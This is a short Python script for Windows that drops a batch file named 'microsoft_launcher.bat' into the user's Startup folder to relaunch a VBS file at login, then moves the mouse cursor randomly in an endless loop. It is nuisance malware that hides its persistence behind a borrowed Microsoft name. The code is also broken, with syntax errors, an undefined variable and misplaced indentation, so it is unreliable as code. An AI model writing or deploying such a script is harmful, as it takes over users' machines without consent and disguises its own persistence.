import os, getpass, ctypes, random

user = getpass.getuser()

start = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

startup_file = start + "microsoft_launcher.bat"

file_start = "launcher.vbs"

SetCursorPos = ctypes.windll.user32.SetCursorPos


# Directory
os.system("echo %cd% >\"cd.tmp\"")_

with open("cd.tmp", "r") as cdfile:
cd = cdfile.read()

cd = cd.replace(" \n", "")

os.system("del \"cd.tmp\"")

# Add Startup
if not os.path.isfile(startup_file):
 with open(start_file, "w"_ as sfile:
 sfile.write("cd " + cd + "\n")
 sfile("start " + file_start)
 
 # Main
 While True:
SetCursorPos(random.randint(0, 1000), random.randint(0, 1000))

 
 
 
 
 
 
 
